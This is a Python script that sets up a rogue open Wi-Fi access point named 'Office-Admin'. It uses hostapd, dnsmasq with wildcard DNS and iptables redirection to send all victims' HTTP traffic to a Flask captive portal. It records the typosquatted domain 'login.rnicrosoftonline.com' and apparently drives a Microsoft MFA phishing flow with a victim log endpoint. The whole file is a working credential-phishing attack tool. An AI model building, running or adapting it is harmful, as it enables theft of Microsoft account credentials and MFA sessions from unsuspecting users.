 #!/usr/bin/env python3


import sys
import os
import subprocess
import signal
import time
import atexit
from pathlib import Path


class Colors:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[31m"

###############################################################################
# Arguments
if len(sys.argv) > 2:
   SSID = sys.argv[1]
   NETWORK = sys.argv[2]
else :
    SSID = "Office-Admin"
    NETWORK = "192.168.99.0"

if len(sys.argv) > 1:
   SSID = sys.argv[1]
   NETWORK = "192.168.99.0"
else :
    SSID = "Office-Admin"
    NETWORK = "192.168.99.0"


IFACE_AP = "wlan0"
IFACE_UP = "eth0"

###############################################################################
# DHCP
_base = NETWORK.rsplit(".", 1)[0]
AP_IP = f"{_base}.1" # The GateWay IP
DHCP_START = f"{_base}.100"  # Starting IP (DHCP)
DHCP_END   = f"{_base}.200" # Ending IP (DHCP)

###############################################################################
# Conf files
DIR = Path(__file__).parent

_hostapd_proc = None
_dnsmasq_proc = None

###############################################################################

def run(cmd: str, ignore_errors=False) -> bool:
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0 and not ignore_errors:
        print(f"[!] {cmd}\n    → {result.stderr.strip()}")
    return result.returncode == 0

###############################################################################

def iface_exists() -> bool:
    return Path(f"/sys/class/net/{IFACE_AP}").exists()

def iface_responsive() -> bool:
    if not iface_exists():
        return False
    try:
        state = Path(f"/sys/class/net/{IFACE_AP}/operstate").read_text().strip()
        result = subprocess.run(
            f"ip link show {IFACE_AP}",
            shell=True, capture_output=True, timeout=3
        )
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False
###############################################################################

def stop_proc(proc):
    if proc and proc.poll() is None:
        proc.terminate()
        try: proc.wait(timeout=3)
        except subprocess.TimeoutExpired: proc.kill()

###############################################################################

def _find_usb_sysfs(vendor_id: str) -> str | None:
    base = Path("/sys/bus/usb/devices")
    for dev in base.iterdir():
        vid_file = dev / "idVendor"
        if vid_file.exists():
            try:
                if vid_file.read_text().strip().lower() == vendor_id.lower():
                    return str(dev)
            except Exception:
                pass
    return None

###############################################################################

def reset_usb_wifi():

    print(f"[usb-reset] {IFACE_AP} stuck or missing — resetting USB adapter...")

    usb_path = _find_usb_sysfs("0e8d")
    if not usb_path:
        print("[usb-reset] Vendor path not found, trying driver unbind/rebind...")
        _usb_reset_via_driver()
        return

    authorized = Path(usb_path) / "authorized"
    print(f"[usb-reset] Found USB device: {usb_path}")
    try:
        print("[usb-reset] Deauthorizing (disconnect)...")
        authorized.write_text("0")
        time.sleep(2)
        print("[usb-reset] Reauthorizing (reconnect)...")
        authorized.write_text("1")
        time.sleep(3)
    except Exception as e:
        print(f"[usb-reset] authorized write failed: {e}")
        _usb_reset_via_driver()
        return
    print("[usb-reset] Waiting for interface to reappear...")
    for i in range(15):
        if iface_exists():
            print(f"[usb-reset] {IFACE_AP} is back after {i+1}s ✓")
            time.sleep(1)
            return
        time.sleep(1)
    print(f"[usb-reset] {IFACE_AP} did not reappear after 15s")

###############################################################################

def _usb_reset_via_driver():
    result = subprocess.run(
        f"readlink /sys/class/net/{IFACE_AP}/device/driver",
        shell=True, capture_output=True, text=True
    )
    module = Path(result.stdout.strip()).name if result.returncode == 0 else ""
    if not module:
        module = "mt7921u"
    print(f"[usb-reset] Unloading module: {module}")
    run(f"rmmod {module}", ignore_errors=True)
    time.sleep(2)
    print(f"[usb-reset] Loading module: {module}")
    run(f"modprobe {module}", ignore_errors=True)
    time.sleep(3)
    for i in range(10):
        if iface_exists():
            print(f"[usb-reset] {IFACE_AP} is back ✓")
            return
        time.sleep(1)
    print(f"[usb-reset] WARNING: {IFACE_AP} still missing after module reload")

###############################################################################
#Cleaning
def cleanup():
    global _hostapd_proc, _dnsmasq_proc

    print("\n[cleanup] Starting...")

    print(f"[cleanup] Stopping hostapd (releasing {IFACE_AP} driver)...")
    stop_proc(_hostapd_proc)
    _hostapd_proc = None
    run("pkill -TERM hostapd", ignore_errors=True)
    time.sleep(3)

    print(f"[cleanup] Unloading WiFi driver...")
    run(f"ip link set {IFACE_AP} down",  ignore_errors=True)
    run(f"ip addr flush dev {IFACE_AP}", ignore_errors=True)
    time.sleep(1)
    run("rmmod mt7921u", ignore_errors=True)
    run("rmmod mt7921",  ignore_errors=True)
    time.sleep(2)

    print("[cleanup] Stopping dnsmasq...")
    stop_proc(_dnsmasq_proc)
    _dnsmasq_proc = None
    run("pkill -TERM dnsmasq", ignore_errors=True)
    time.sleep(0.5)

    print("[cleanup] Flushing iptables...")
    for cmd in [
        "iptables -P INPUT   ACCEPT",
        "iptables -P FORWARD ACCEPT",
        "iptables -P OUTPUT  ACCEPT",
        "iptables -F",
        "iptables -X",
        "iptables -t nat    -F",
        "iptables -t nat    -X",
        "iptables -t mangle -F",
        "iptables -t mangle -X",
    ]:
        run(cmd, ignore_errors=True)

    print("[cleanup] Disabling IP forwarding...")
    run("echo 0 > /proc/sys/net/ipv4/ip_forward", ignore_errors=True)

    print(f"[cleanup] Bringing down {IFACE_AP}...")
    run(f"ip addr flush dev {IFACE_AP}", ignore_errors=True)
    run(f"ip link set {IFACE_AP} down",  ignore_errors=True)

    _resolv_backup = Path("/tmp/resolv.conf.bak")
    if _resolv_backup.exists():
        try:
            Path("/etc/resolv.conf").write_text(_resolv_backup.read_text())
            _resolv_backup.unlink(missing_ok=True)
            print("[cleanup] /etc/resolv.conf restored")
        except Exception as e:
            print(f"[cleanup] Could not restore resolv.conf: {e}")

    print("[cleanup] Removing temp files...")
    for f in ["/tmp/hostapd_run.conf", "/tmp/dnsmasq_run.conf", "/tmp/captive_ap_ip.txt", "/tmp/captive_portal_domain.txt"]:
        Path(f).unlink(missing_ok=True)

    print("[cleanup] Done — ready for next run.\n")

###############################################################################
#Setting up:
def setup():
    global _hostapd_proc, _dnsmasq_proc

    print(f"\n[setup] SSID    : {SSID}")
    print(f"[setup] Network : {NETWORK}/24")
    print(f"[setup] AP IP   : {AP_IP}")
    print(f"[setup] DHCP    : {DHCP_START} – {DHCP_END}\n")

    print("[setup] Stopping existing services...")
    for svc in ["NetworkManager", "wpa_supplicant", "systemd-resolved"]:
        run(f"systemctl stop {svc}", ignore_errors=True)
    
    run("pkill wpa_supplicant", ignore_errors=True)
    run("pkill hostapd", ignore_errors=True)
    run("pkill dnsmasq", ignore_errors=True)
    time.sleep(1)

    print(f"[setup] Reviving host internet on {IFACE_UP}...")
    run(f"ip link set {IFACE_UP} up")

    run(f"dhclient {IFACE_UP}", ignore_errors=True) 

    _resolv = Path("/etc/resolv.conf")
    _resolv_backup = Path("/tmp/resolv.conf.bak")
    try:
        if _resolv.is_symlink():
            _resolv.unlink()
        _resolv.write_text("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")
        print("[setup] Host DNS -> (8.8.8.8) (1.1.1.1)")
    except Exception as e:
        print(f"[!] DNS failed: {e}")

    import socket
    try:
        host = "login.microsoftonline.com"
        ip_check = socket.gethostbyname(host)
        print(f"[setup] Connectivity check: {host} -> {ip_check} - OK!!!")
    except Exception:
        print(f"{Colors.RED}[!] WARNING: Host cannot resolve {host}. MS flow will fail!, cshutdown the tool, check connectivity and run again mami{Colors.RESET}")

    print(f"[setup] Reloading WiFi driver (mt7921u)...")
    run("rmmod mt7921u", ignore_errors=True)
    run("rmmod mt7921", ignore_errors=True)
    time.sleep(2)
    run("modprobe mt7921u", ignore_errors=True)
    run("modprobe mt7921", ignore_errors=True)

    for i in range(15):
        if iface_exists():
            print(f"[setup] {IFACE_AP} ready!!!")
            break
        time.sleep(1)
    else:
        print(f"[!] {IFACE_AP} did not appear. Aborting.")
        sys.exit(1)

    run("rfkill unblock wifi", ignore_errors=True)
    print(f"[setup] Configuring {IFACE_AP} → {AP_IP}...")
    run(f"iw dev {IFACE_AP} set type managed", ignore_errors=True)
    run(f"ip addr flush dev {IFACE_AP}", ignore_errors=True)
    run(f"ip addr add {AP_IP}/24 dev {IFACE_AP}")
    run(f"ip link set {IFACE_AP} up")


    run("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[setup] Configuring iptables rules...")
    for cmd in [
        "iptables -F", "iptables -X", "iptables -t nat -F", "iptables -t nat -X",
        f"iptables -t nat -A POSTROUTING -o {IFACE_UP} -j MASQUERADE",
        f"iptables -A FORWARD -i {IFACE_AP} -o {IFACE_UP} -j ACCEPT",
        f"iptables -A FORWARD -i {IFACE_UP} -o {IFACE_AP} -m state --state RELATED,ESTABLISHED -j ACCEPT",
        ## Funcing Important!!!:
        f"iptables -t nat -A PREROUTING -i {IFACE_AP} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:80",
        f"iptables -A INPUT -i {IFACE_AP} -p udp --dport 67 -j ACCEPT",
        f"iptables -A INPUT -i {IFACE_AP} -p udp --dport 53 -j ACCEPT",
        f"iptables -A INPUT -i {IFACE_AP} -p tcp --dport 80 -j ACCEPT",
    ]:
        run(cmd, ignore_errors=True)


    hostapd_conf = f"interface={IFACE_AP}\ndriver=nl80211\nssid={SSID}\nchannel=6\nhw_mode=g\nauth_algs=1\nwpa=0\ncountry_code=IL\n"
    Path("/tmp/hostapd_run.conf").write_text(hostapd_conf)


    dnsmasq_conf = f"interface={IFACE_AP}\nbind-interfaces\ndhcp-range={DHCP_START},{DHCP_END},255.255.255.0,15m\ndhcp-option=3,{AP_IP}\ndhcp-option=6,{AP_IP}\naddress=/#/{AP_IP}\ncache-size=0\n"
    Path("/tmp/dnsmasq_run.conf").write_text(dnsmasq_conf)


    print("[setup] Starting dnsmasq & hostapd...")
    _dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq_run.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    _hostapd_proc = subprocess.Popen(["hostapd", "/tmp/hostapd_run.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    Path("/tmp/captive_portal_domain.txt").write_text("login.rnicrosoftonline.com") 
    Path("/tmp/captive_ap_ip.txt").write_text(AP_IP)
    print(f"\n[+] AP is UP — SSID: {SSID} | IP: {AP_IP}\n")
###############################################################################


def main():
    if os.geteuid() != 0:
        print("[!] Needs root privilege:  sudo python3 run_portal.py <SSID> <Network>")
        sys.exit(1)

    atexit.register(cleanup)

    signal.signal(signal.SIGINT,  lambda *_: sys.exit(0))
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(0))

    setup()

    print(f"[portal] Starting Flask server on port 80...")
    print(f"[portal] Portal  : http://{AP_IP}")
    print(f"[portal] Log     : http://{AP_IP}/api/log")
    print(f"[portal] Active  : http://{AP_IP}/api/active")
    print(f"[portal] Ctrl+C to stop and clean up everything\n")

    sys.path.insert(0, str(DIR))
    from ms_mfa_web import app, init_db

    init_db()
    app.run(host="0.0.0.0", port=80, debug=False, threaded=True)


if __name__ == "__main__":
    main()
